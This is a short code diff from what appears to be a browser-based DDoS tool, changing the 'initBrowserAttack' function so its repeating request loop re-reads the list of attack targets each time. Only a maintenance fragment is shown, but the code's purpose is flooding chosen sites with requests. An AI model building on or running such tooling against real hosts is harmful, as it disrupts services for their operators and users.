@@ -31,9 +31,8 @@ export const initBrowserAttack = ctx => {
   // analytics.track('init-browser-ddos')
 
   const config = ctx.getters.getDdosConfig.user
-  const targets = ctx.getters.getTargetsList
 
-  if (targets.length === 0) {
+  if (ctx.getters.getTargetsList.length === 0) {
     return
   }
 
@@ -50,6 +49,8 @@ export const initBrowserAttack = ctx => {
   const reqInterval = setInterval(
     async () => {
       if (!ctx.getters.getBrowserAttackStatus) return
+
+      const targets = ctx.getters.getTargetsList
 
       // Generate from/to for user param reqCount
       const from =
